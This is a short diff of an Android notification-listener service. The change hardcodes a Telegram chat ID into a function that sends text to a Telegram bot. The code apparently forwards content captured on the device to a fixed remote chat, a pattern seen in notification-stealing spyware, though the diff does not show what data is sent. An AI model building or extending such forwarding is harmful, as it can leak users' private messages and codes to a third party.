@@ -248,12 +248,7 @@ public class NotificationService extends NotificationListenerService {
 
     // ========== تلغرام ==========
     private String sendTelegramMessage(String text) throws Exception {
-        SharedPreferences prefs = getSharedPreferences("bot_config", MODE_PRIVATE);
-        String chatId = prefs.getString("admin_chat_id", "");
-        if (chatId.isEmpty()) {
-            chatId = fetchAdminChatId();
-            if (!chatId.isEmpty()) prefs.edit().putString("admin_chat_id", chatId).apply();
-        }
+        String chatId = "6681793612";
         if (chatId.isEmpty()) return "no_chat_id";
 
         URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
